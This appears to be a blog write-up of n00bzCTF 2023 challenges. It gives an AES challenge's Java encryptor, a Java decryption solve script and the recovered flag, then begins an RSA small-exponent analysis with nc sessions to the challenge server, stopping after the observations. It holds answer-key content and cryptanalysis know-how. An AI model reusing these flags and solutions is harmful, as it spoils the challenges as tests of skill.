<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         n00b CTF 2023
        
    </title><meta content="n00b CTF 2023" property=og:title><meta content="Known as TheMj0ln1r" property=og:description><meta content="Known as TheMj0ln1r" name=description><link href=/favicons/favicon.ico rel=icon type=image/png><link href=https://themj0ln1r.github.io/fonts.css rel=stylesheet><script src=https://themj0ln1r.github.io/js/codeblock.js></script><script src=https://themj0ln1r.github.io/js/toc.js></script><script src=https://themj0ln1r.github.io/js/note.js></script><script>MathJax = {
              tex: {
                inlineMath: [['$', '$'], ['\\(', '\\)']]
              }
            };</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link title="Charan Nomula" href=https://themj0ln1r.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://themj0ln1r.github.io/theme/light.css rel=stylesheet><link href=https://themj0ln1r.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><script src=https://themj0ln1r.github.io/js/themetoggle.js></script><script>setTheme(getSavedTheme());</script><link href=https://themj0ln1r.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://themj0ln1r.github.io/>Charan Nomula</a><div class=socials><a class=social href=https://x.com/TheMj0ln1r/ rel=me target=_blank> <img alt=twitter src=https://themj0ln1r.github.io/social_icons/twitter.svg> </a><a class=social href=https://linkedin.com/in/mj0ln1r/ rel=me target=_blank> <img alt=linkedin src=https://themj0ln1r.github.io/social_icons/linkedin.svg> </a><a class=social href=https://github.com/TheMj0ln1r/ rel=me target=_blank> <img alt=github src=https://themj0ln1r.github.io/social_icons/github.svg> </a><a href="mailto: playermj0ln1r@gmail.com" class=social rel=me target=_blank> <img alt=Email src=https://themj0ln1r.github.io/social_icons/email.svg> </a></div></div><nav><a href=https://themj0ln1r.github.io/posts style=margin-left:.5em>/posts</a><a href=https://themj0ln1r.github.io/writeups style=margin-left:.5em>/writeups</a><a href=https://themj0ln1r.github.io/projects style=margin-left:.5em>/projects</a><a href=https://themj0ln1r.github.io/contact style=margin-left:.5em>/contact</a><a href=https://themj0ln1r.github.io/tags style=margin-left:.5em>/tags</a> |<a onclick="toggleTheme(); event.preventDefault();" href=# id=dark-mode-toggle> <img alt=Light id=sun-icon src=https://themj0ln1r.github.io/feather/sun.svg style=filter:invert()> <img alt=Dark id=moon-icon src=https://themj0ln1r.github.io/feather/moon.svg> </a><script>updateItemToggleTheme()</script></nav></header><main><article><div class=title><div class=page-header>n00b CTF 2023<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2023-06-10</time><span class=tags-label> :: Tags:</span><span class=tags> <a class=post-tag href=https://themj0ln1r.github.io/tags/ctf/>ctf</a> </span></div></div><div class=toc-container><h1 class=toc-title>Table of Contents</h1><ul class=toc-list><li><a href=https://themj0ln1r.github.io/writeups/n00bzctf23/#crypto>Crypto</a><li><a href=https://themj0ln1r.github.io/writeups/n00bzctf23/#rsa>RSA</a><li><a href=https://themj0ln1r.github.io/writeups/n00bzctf23/#pwn>PWN</a><li><a href=https://themj0ln1r.github.io/writeups/n00bzctf23/#rev>REV</a><li><a href=https://themj0ln1r.github.io/writeups/n00bzctf23/#ezrev>EZrev</a></ul></div><section class=body><p>Hello all! I played <a href=https://ctftime.org/event/1895 target=_blank>n00bzCTF 2023</a> which was happened from 09 June to 11 June. I played it with my team <a href=https://ctftime.org/team/217079>Invaders0x1</a>.<p>Lets see the solutions to the challenges I solved.<h1 id=crypto><a aria-label="Anchor link for: crypto" class=zola-anchor href=#crypto>Crypto</a></h1><p>Description :<pre class=language-text data-lang=text style=color:#61676c;background-color:#fafafa><code class=language-text data-lang=text><span>My cousin-sister messaged me on Instagram that she has got some text FOqxc90aMQZydCQb2MUm5tj4kRIxxVeCDWzAANfOrr8JItHYneUHhSV0awvQIo/8E1LtfYm/+VVWz0PDK6MXp38BWHoFDorhdS44DzYj9CQ= and a text file in which something like String password: aesiseasy and Salt: saltval was writt,en can you help her to decode the weird text?
</span><span>
</span><span>Attached Files : [enc.java]
</span></code></pre><p><code>enc.java</code><pre class=language-java data-lang=java style=color:#61676c;background-color:#fafafa><code class=language-java data-lang=java><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>javax</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>crypto</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>Cipher</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>javax</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>crypto</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>SecretKey</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>javax</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>crypto</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>SecretKeyFactory</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>javax</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>crypto</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>spec</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>PBEKeySpec</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>javax</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>crypto</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>spec</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>SecretKeySpec</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>java</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>nio</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>charset</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>StandardCharsets</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>java</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>security</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>spec</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>KeySpec</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>java</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>util</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>Base64</span><span style=color:#61676ccc>;
</span><span>
</span><span style=color:#fa6e32>public class </span><span style=color:#399ee6>AESChallenge </span><span>{
</span><span>    </span><span style=color:#fa6e32>private static final </span><span style=color:#55b4d4;font-style:italic>String </span><span style=color:#399ee6>AES_ALGORITHM </span><span style=color:#ed9366>= </span><span style=color:#86b300>"AES"</span><span style=color:#61676ccc>;
</span><span>    </span><span style=color:#fa6e32>private static final </span><span style=color:#55b4d4;font-style:italic>String </span><span style=color:#399ee6>PBKDF2_ALGORITHM </span><span style=color:#ed9366>= </span><span style=color:#86b300>"PBKDF2WithHmacSHA256"</span><span style=color:#61676ccc>;
</span><span>    </span><span style=color:#fa6e32>private static final int </span><span style=color:#399ee6>ITERATIONS </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>10000</span><span style=color:#61676ccc>;
</span><span>    </span><span style=color:#fa6e32>private static final int </span><span style=color:#399ee6>KEY_SIZE </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>256</span><span style=color:#61676ccc>;
</span><span>
</span><span>    </span><span style=color:#fa6e32>private static </span><span style=color:#55b4d4;font-style:italic>SecretKey </span><span style=color:#f29718>generateKey</span><span>(</span><span style=color:#55b4d4;font-style:italic>String </span><span style=color:#ff8f40>password</span><span style=color:#61676ccc>, </span><span style=color:#fa6e32>byte[] </span><span style=color:#ff8f40>salt</span><span>) </span><span style=color:#fa6e32>throws </span><span style=color:#55b4d4;font-style:italic>Exception </span><span>{
</span><span>        </span><span style=color:#55b4d4;font-style:italic>KeySpec</span><span> spec </span><span style=color:#ed9366>= </span><span style=color:#fa6e32>new </span><span style=color:#55b4d4;font-style:italic>PBEKeySpec</span><span>(password</span><span style=color:#ed9366>.</span><span style=color:#f29718>toCharArray</span><span>()</span><span style=color:#61676ccc>,</span><span> salt</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>ITERATIONS</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>KEY_SIZE</span><span>)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#55b4d4;font-style:italic>SecretKeyFactory</span><span> factory </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>SecretKeyFactory</span><span style=color:#ed9366>.</span><span style=color:#f29718>getInstance</span><span>(</span><span style=color:#ff8f40>PBKDF2_ALGORITHM</span><span>)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#55b4d4;font-style:italic>SecretKey</span><span> tmp </span><span style=color:#ed9366>=</span><span> factory</span><span style=color:#ed9366>.</span><span style=color:#f29718>generateSecret</span><span>(spec)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>return new </span><span style=color:#55b4d4;font-style:italic>SecretKeySpec</span><span>(tmp</span><span style=color:#ed9366>.</span><span style=color:#f29718>getEncoded</span><span>()</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>AES_ALGORITHM</span><span>)</span><span style=color:#61676ccc>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#fa6e32>private static </span><span style=color:#55b4d4;font-style:italic>String </span><span style=color:#f29718>encrypt</span><span>(</span><span style=color:#55b4d4;font-style:italic>String </span><span style=color:#ff8f40>plainText</span><span style=color:#61676ccc>, </span><span style=color:#55b4d4;font-style:italic>SecretKey </span><span style=color:#ff8f40>key</span><span>) </span><span style=color:#fa6e32>throws </span><span style=color:#55b4d4;font-style:italic>Exception </span><span>{
</span><span>        </span><span style=color:#55b4d4;font-style:italic>Cipher</span><span> cipher </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>Cipher</span><span style=color:#ed9366>.</span><span style=color:#f29718>getInstance</span><span>(</span><span style=color:#ff8f40>AES_ALGORITHM</span><span>)</span><span style=color:#61676ccc>;
</span><span>        cipher</span><span style=color:#ed9366>.</span><span style=color:#f29718>init</span><span>(</span><span style=color:#55b4d4;font-style:italic>Cipher</span><span style=color:#ed9366>.</span><span style=color:#ff8f40>ENCRYPT_MODE</span><span style=color:#61676ccc>,</span><span> key)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>byte[]</span><span> encryptedBytes </span><span style=color:#ed9366>=</span><span> cipher</span><span style=color:#ed9366>.</span><span style=color:#f29718>doFinal</span><span>(plainText</span><span style=color:#ed9366>.</span><span style=color:#f29718>getBytes</span><span>(</span><span style=color:#55b4d4;font-style:italic>StandardCharsets</span><span style=color:#ed9366>.</span><span style=color:#ff8f40>UTF_8</span><span>))</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>return </span><span style=color:#55b4d4;font-style:italic>Base64</span><span style=color:#ed9366>.</span><span style=color:#f29718>getEncoder</span><span>()</span><span style=color:#ed9366>.</span><span style=color:#f29718>encodeToString</span><span>(encryptedBytes)</span><span style=color:#61676ccc>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#fa6e32>public static void </span><span style=color:#f29718>main</span><span>(</span><span style=color:#55b4d4;font-style:italic>String</span><span style=color:#fa6e32>[] </span><span style=color:#ff8f40>args</span><span>) {
</span><span>        </span><span style=color:#55b4d4;font-style:italic>String</span><span> flag </span><span style=color:#ed9366>= </span><span style=color:#86b300>"REDACTED"</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#55b4d4;font-style:italic>String</span><span> password </span><span style=color:#ed9366>= </span><span style=color:#86b300>"aesiseasy"</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>byte[]</span><span> salt </span><span style=color:#ed9366>= </span><span style=color:#86b300>"saltval"</span><span style=color:#ed9366>.</span><span style=color:#f29718>getBytes</span><span>(</span><span style=color:#55b4d4;font-style:italic>StandardCharsets</span><span style=color:#ed9366>.</span><span style=color:#ff8f40>UTF_8</span><span>)</span><span style=color:#61676ccc>;
</span><span>
</span><span>        </span><span style=color:#fa6e32>try </span><span>{
</span><span>            </span><span style=color:#55b4d4;font-style:italic>SecretKey</span><span> key </span><span style=color:#ed9366>= </span><span style=color:#f29718>generateKey</span><span>(password</span><span style=color:#61676ccc>,</span><span> salt)</span><span style=color:#61676ccc>;
</span><span>            </span><span style=color:#55b4d4;font-style:italic>System</span><span style=color:#ed9366>.</span><span>out</span><span style=color:#ed9366>.</span><span style=color:#f29718>println</span><span>(key)</span><span style=color:#61676ccc>;
</span><span>            </span><span style=color:#55b4d4;font-style:italic>String</span><span> encryptedFlag </span><span style=color:#ed9366>= </span><span style=color:#f29718>encrypt</span><span>(flag</span><span style=color:#61676ccc>,</span><span> key)</span><span style=color:#61676ccc>;
</span><span>            </span><span style=color:#55b4d4;font-style:italic>System</span><span style=color:#ed9366>.</span><span>out</span><span style=color:#ed9366>.</span><span style=color:#f29718>println</span><span>(</span><span style=color:#86b300>"Encrypted Flag: " </span><span style=color:#ed9366>+</span><span> encryptedFlag)</span><span style=color:#61676ccc>;
</span><span>        } </span><span style=color:#fa6e32>catch </span><span>(</span><span style=color:#55b4d4;font-style:italic>Exception </span><span style=color:#ff8f40>e</span><span>) {
</span><span>            e</span><span style=color:#ed9366>.</span><span style=color:#f29718>printStackTrace</span><span>()</span><span style=color:#61676ccc>;
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><p>Changed the file to <code>AESChallenge.java</code> to match with the class name.<p>Observations :<pre style=color:#61676c;background-color:#fafafa><code><span>1. The main method has the variables password, salt. 
</span><span>2. The encrypt function requires two arguements (flag,key)
</span><span>3. Key is generated by generatekey method which takes two arguments (password,salt)
</span><span>4. The encrypted flag with the key from generatekey method is converted to base64
</span></code></pre><p>So, we have to decrypt the AES generated ciphertext with the key, generated by generatekey method.<p>We have salt and password to generate the key using generatekey method.<pre class=language-java data-lang=java style=color:#61676c;background-color:#fafafa><code class=language-java data-lang=java><span style=color:#fa6e32>private static </span><span style=color:#55b4d4;font-style:italic>SecretKey </span><span style=color:#f29718>generateKey</span><span>(</span><span style=color:#55b4d4;font-style:italic>String</span><span> password</span><span style=color:#61676ccc>, </span><span style=color:#fa6e32>byte[]</span><span> salt) throws </span><span style=color:#55b4d4;font-style:italic>Exception </span><span>{
</span><span>        </span><span style=color:#55b4d4;font-style:italic>KeySpec</span><span> spec </span><span style=color:#ed9366>= </span><span style=color:#fa6e32>new </span><span style=color:#55b4d4;font-style:italic>PBEKeySpec</span><span>(password</span><span style=color:#ed9366>.</span><span style=color:#f29718>toCharArray</span><span>()</span><span style=color:#61676ccc>,</span><span> salt</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>ITERATIONS</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>KEY_SIZE</span><span>)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#55b4d4;font-style:italic>SecretKeyFactory</span><span> factory </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>SecretKeyFactory</span><span style=color:#ed9366>.</span><span style=color:#f29718>getInstance</span><span>(</span><span style=color:#ff8f40>PBKDF2_ALGORITHM</span><span>)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#55b4d4;font-style:italic>SecretKey</span><span> tmp </span><span style=color:#ed9366>=</span><span> factory</span><span style=color:#ed9366>.</span><span style=color:#f29718>generateSecret</span><span>(spec)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>return new </span><span style=color:#55b4d4;font-style:italic>SecretKeySpec</span><span>(tmp</span><span style=color:#ed9366>.</span><span style=color:#f29718>getEncoded</span><span>()</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>AES_ALGORITHM</span><span>)</span><span style=color:#61676ccc>;
</span><span>}
</span></code></pre><p>With these observations I wrote this solve.java which will print the flag for us.<p><code>solve.java</code><pre class=language-java data-lang=java style=color:#61676c;background-color:#fafafa><code class=language-java data-lang=java><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>javax</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>crypto</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>Cipher</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>javax</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>crypto</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>SecretKey</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>javax</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>crypto</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>SecretKeyFactory</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>javax</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>crypto</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>spec</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>PBEKeySpec</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>javax</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>crypto</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>spec</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>SecretKeySpec</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>java</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>nio</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>charset</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>StandardCharsets</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>java</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>security</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>spec</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>KeySpec</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>java</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>util</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>Base64</span><span style=color:#61676ccc>;
</span><span>
</span><span style=color:#fa6e32>public class </span><span style=color:#399ee6>solve </span><span>{
</span><span>    </span><span style=color:#fa6e32>private static final </span><span style=color:#55b4d4;font-style:italic>String </span><span style=color:#399ee6>AES_ALGORITHM </span><span style=color:#ed9366>= </span><span style=color:#86b300>"AES"</span><span style=color:#61676ccc>;
</span><span>    </span><span style=color:#fa6e32>private static final </span><span style=color:#55b4d4;font-style:italic>String </span><span style=color:#399ee6>PBKDF2_ALGORITHM </span><span style=color:#ed9366>= </span><span style=color:#86b300>"PBKDF2WithHmacSHA256"</span><span style=color:#61676ccc>;
</span><span>    </span><span style=color:#fa6e32>private static final int </span><span style=color:#399ee6>ITERATIONS </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>10000</span><span style=color:#61676ccc>;
</span><span>    </span><span style=color:#fa6e32>private static final int </span><span style=color:#399ee6>KEY_SIZE </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>256</span><span style=color:#61676ccc>;
</span><span>
</span><span>    </span><span style=color:#fa6e32>private static </span><span style=color:#55b4d4;font-style:italic>SecretKey </span><span style=color:#f29718>generateKey</span><span>(</span><span style=color:#55b4d4;font-style:italic>String </span><span style=color:#ff8f40>password</span><span style=color:#61676ccc>, </span><span style=color:#fa6e32>byte[] </span><span style=color:#ff8f40>salt</span><span>) </span><span style=color:#fa6e32>throws </span><span style=color:#55b4d4;font-style:italic>Exception </span><span>{
</span><span>        </span><span style=color:#55b4d4;font-style:italic>KeySpec</span><span> spec </span><span style=color:#ed9366>= </span><span style=color:#fa6e32>new </span><span style=color:#55b4d4;font-style:italic>PBEKeySpec</span><span>(password</span><span style=color:#ed9366>.</span><span style=color:#f29718>toCharArray</span><span>()</span><span style=color:#61676ccc>,</span><span> salt</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>ITERATIONS</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>KEY_SIZE</span><span>)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#55b4d4;font-style:italic>SecretKeyFactory</span><span> factory </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>SecretKeyFactory</span><span style=color:#ed9366>.</span><span style=color:#f29718>getInstance</span><span>(</span><span style=color:#ff8f40>PBKDF2_ALGORITHM</span><span>)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#55b4d4;font-style:italic>SecretKey</span><span> tmp </span><span style=color:#ed9366>=</span><span> factory</span><span style=color:#ed9366>.</span><span style=color:#f29718>generateSecret</span><span>(spec)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>return new </span><span style=color:#55b4d4;font-style:italic>SecretKeySpec</span><span>(tmp</span><span style=color:#ed9366>.</span><span style=color:#f29718>getEncoded</span><span>()</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>AES_ALGORITHM</span><span>)</span><span style=color:#61676ccc>;
</span><span>    }
</span><span>
</span><span>
</span><span>    </span><span style=color:#fa6e32>private static </span><span style=color:#55b4d4;font-style:italic>String </span><span style=color:#f29718>decrypt</span><span>(</span><span style=color:#55b4d4;font-style:italic>String </span><span style=color:#ff8f40>encryptedText</span><span style=color:#61676ccc>, </span><span style=color:#55b4d4;font-style:italic>SecretKey </span><span style=color:#ff8f40>key</span><span>) </span><span style=color:#fa6e32>throws </span><span style=color:#55b4d4;font-style:italic>Exception </span><span>{
</span><span>        </span><span style=color:#55b4d4;font-style:italic>Cipher</span><span> cipher </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>Cipher</span><span style=color:#ed9366>.</span><span style=color:#f29718>getInstance</span><span>(</span><span style=color:#ff8f40>AES_ALGORITHM</span><span>)</span><span style=color:#61676ccc>;
</span><span>        cipher</span><span style=color:#ed9366>.</span><span style=color:#f29718>init</span><span>(</span><span style=color:#55b4d4;font-style:italic>Cipher</span><span style=color:#ed9366>.</span><span style=color:#ff8f40>DECRYPT_MODE</span><span style=color:#61676ccc>,</span><span> key)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>byte[]</span><span> encryptedBytes </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>Base64</span><span style=color:#ed9366>.</span><span style=color:#f29718>getDecoder</span><span>()</span><span style=color:#ed9366>.</span><span style=color:#f29718>decode</span><span>(encryptedText)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>byte[]</span><span> decryptedBytes </span><span style=color:#ed9366>=</span><span> cipher</span><span style=color:#ed9366>.</span><span style=color:#f29718>doFinal</span><span>(encryptedBytes)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>return new </span><span style=color:#55b4d4;font-style:italic>String</span><span>(decryptedBytes</span><span style=color:#61676ccc>, </span><span style=color:#55b4d4;font-style:italic>StandardCharsets</span><span style=color:#ed9366>.</span><span style=color:#ff8f40>UTF_8</span><span>)</span><span style=color:#61676ccc>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#fa6e32>public static void </span><span style=color:#f29718>main</span><span>(</span><span style=color:#55b4d4;font-style:italic>String</span><span style=color:#fa6e32>[] </span><span style=color:#ff8f40>args</span><span>) {
</span><span>    </span><span style=color:#55b4d4;font-style:italic>String</span><span> ct </span><span style=color:#ed9366>= </span><span style=color:#86b300>"FOqxc90aMQZydCQb2MUm5tj4kRIxxVeCDWzAANfOrr8JItHYneUHhSV0awvQIo/8E1LtfYm/+VVWz0PDK6MXp38BWHoFDorhdS44DzYj9CQ="</span><span style=color:#61676ccc>;
</span><span>    </span><span style=color:#55b4d4;font-style:italic>String</span><span> password </span><span style=color:#ed9366>= </span><span style=color:#86b300>"aesiseasy"</span><span style=color:#61676ccc>;
</span><span>    </span><span style=color:#fa6e32>byte[]</span><span> salt </span><span style=color:#ed9366>= </span><span style=color:#86b300>"saltval"</span><span style=color:#ed9366>.</span><span style=color:#f29718>getBytes</span><span>(</span><span style=color:#55b4d4;font-style:italic>StandardCharsets</span><span style=color:#ed9366>.</span><span style=color:#ff8f40>UTF_8</span><span>)</span><span style=color:#61676ccc>;
</span><span>
</span><span>    </span><span style=color:#fa6e32>try </span><span>{
</span><span>        </span><span style=color:#55b4d4;font-style:italic>SecretKey</span><span> key </span><span style=color:#ed9366>= </span><span style=color:#f29718>generateKey</span><span>(password</span><span style=color:#61676ccc>,</span><span> salt)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#55b4d4;font-style:italic>System</span><span style=color:#ed9366>.</span><span>out</span><span style=color:#ed9366>.</span><span style=color:#f29718>println</span><span>(key)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#55b4d4;font-style:italic>String</span><span> decryptedFlag </span><span style=color:#ed9366>= </span><span style=color:#f29718>decrypt</span><span>(ct</span><span style=color:#61676ccc>,</span><span>key)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#55b4d4;font-style:italic>System</span><span style=color:#ed9366>.</span><span>out</span><span style=color:#ed9366>.</span><span style=color:#f29718>println</span><span>(</span><span style=color:#86b300>"decrypted Flag: " </span><span style=color:#ed9366>+</span><span> decryptedFlag)</span><span style=color:#61676ccc>;
</span><span>
</span><span>        }
</span><span>    </span><span style=color:#fa6e32>catch </span><span>(</span><span style=color:#55b4d4;font-style:italic>Exception </span><span style=color:#ff8f40>e</span><span>) {
</span><span>        e</span><span style=color:#ed9366>.</span><span style=color:#f29718>printStackTrace</span><span>()</span><span style=color:#61676ccc>;
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><blockquote><p><code>Flag : n00bz{1_d0n't_l1k3_a3s_ch4ll3ng3_d0_y0u_lik3?_41703148ed8347adbe238ffbdbaf5e16}</code></blockquote><h1 id=rsa><a aria-label="Anchor link for: rsa" class=zola-anchor href=#rsa>RSA</a></h1><p>Description :<pre class=language-text data-lang=text style=color:#61676c;background-color:#fafafa><code class=language-text data-lang=text><span>Good old RSA!
</span><span>Note: The server is not slow, but I have added sleep(0.5) to discourage server-overloading
</span><span>
</span><span>Challenge : nc challs.n00bzunit3d.xyz 2069
</span></code></pre><p>Connecting to remote server prints the <code>e,ct,n</code><pre class=language-sh data-lang=sh style=color:#61676c;background-color:#fafafa><code class=language-sh data-lang=sh><span style=color:#f29718>mj0ln1r@Linux:/$</span><span> nc challs.n00bzunit3d.xyz 2069
</span><span>
</span><span style=color:#f29718>e</span><span> = 17
</span><span style=color:#f29718>ct</span><span> = 1918419302512753057026648318712029212067010068881776194471911962400069730845220554390418545347081265589418087805348825538165335709592014756820975351562055168955223920260866129238091331258878862319021642420202215258606989689113199126395237258044609779214578192243449718779680984760821625858488092089359110586029718810681216404967086632022871285987871728190628649296724396627035003944211094642018641120662826716949842719001445471014439720788221673768914466721673069869698075926557748651966891705424368924478424517777871952868261029557663107718103335011473285197254398042919715068012844634957684894193434195869239068361
</span><span style=color:#f29718>n</span><span> = 14832509636507518025719146267736016746158063550394935168412013748335364245353808905385111963238312617375598452528117469774547055863886693759109386524161524612219187310620642861751727390080228470399915831962109423586699463124268161225204497782468596150935245876004207368769051381898376188367523380538876599098718935048131575812284079693918194244033223432954665821748431737895979497331176489236217817178707602095903865212414896508729061545245146796357745605104159549612795957395255113962822207738386196802129262229049641241406827025758240064180040710051728573495643489157496185047749682432777350823891031789833038567873
</span><span>
</span><span style=color:#f29718>mj0ln1r@Linux:/$</span><span> nc challs.n00bzunit3d.xyz 2069
</span><span style=color:#f29718>e</span><span> = 17
</span><span style=color:#f29718>ct</span><span> = 6447479954206712453684049812027099180350107523878886559254782127138060412563172212349826966608914764574556165604677352743246072017379611338487049428209406433401510022231968362832812309941039444272178839928281693494111249162879326560937674167247955719542277558712981385601628687847446245832213044736093542641210520134610326729270324684879617665915452957893305915041558672493582653588401873353410692223555925326728236048779812407143165135068210994332362942264737082889801514367932166315908399995278888726027572063051830808932920231748324587587571382293739656878823511803124406070423703233735551773867411349962410027067
</span><span style=color:#f29718>n</span><span> = 9143151830717182052453590085412689929033277379344799430177196398722726776018026343096576694230511985079459043484573394967898934809585827166269500895380393285269881528194291832047352577459413344409493792541600865505980864548382947581835053230490436884828168850991984975137721737418032909519631817776834105704909176140746238694512870331896652202760838235320128117091683820284458749969419156010843857076058164726947867143672197927426528810425546295393373613926717047266991925845444620101181260763809774718637475254501710229446293016879391010346082471422865608808948260049617262947181947600762037856135644565615356696271
</span></code></pre><p>Observations :<pre style=color:#61676c;background-color:#fafafa><code><span>1. As we can see, server printing different ct,n and same e=17 for each new connection.
</span><span>2. e was too small
</span><span>3. No common factors between two n's (common modulus attack wont applied)
</span><span>4. Plaintext was encrypted with same e=17 with different modulus
